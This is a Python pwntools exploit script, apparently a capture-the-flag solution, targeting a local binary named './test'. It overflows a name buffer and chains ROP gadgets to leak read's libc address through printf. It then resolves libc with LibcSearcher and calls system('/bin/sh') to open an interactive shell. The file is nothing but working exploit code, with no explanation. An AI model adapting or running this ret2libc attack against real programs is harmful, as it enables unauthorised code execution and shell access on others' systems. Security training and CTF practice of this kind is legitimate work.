from pwn import *
from LibcSearcher import * 

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

file = './test'

if args['REMOTE']:
    p = remote('', )
else:
    p = process(file)
elf = ELF(file)

#libc = ELF('./libc.so.6')
context(os='linux', arch='amd64', log_level='debug')

code_base = 0 
def debugf(b):
	global p
	if debug:
		gdb.attach(p,"b *{b}".format(b = hex(code_base + b)))
	#p = gdb.debug("{}".format(file),"b *{b}".format(b = hex(code_base + b)))



pop_rsi_r15 = 0x0000000000400821
pop_rdi = 0x0000000000400823
main = 0x0000000000400769
bss = 0x0601068


p.recvuntil('how long is your name: ')
p.sendline('512')
p.recvuntil('you name? ')
payload = 'a' * 0x88 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(elf.plt['read']) + p64(main)
p.sendline(payload)
p.sendline('%p\x00')

debugf(0x00400768)
p.recvuntil('how long is your name: ')
p.sendline('512')
p.recvuntil('you name? ')
payload = 'a' * 0x80 + 'b' * 8 + p64(pop_rdi) +  p64(elf.got['read']) + p64(elf.plt['printf']) + p64(main)
p.send(payload)

p.recvuntil('bbbbbbbb')
p.recv(3)
read_addr = u64(p.recv(6).ljust(8, '\x00'))

log.success('read_addr is' + hex(read_addr))

libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

p.recvuntil('how long is your name')
p.sendline('512')
p.recvuntil('you name? ')
payload = 'a' * 0x88 + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)

p.interactive('\n>')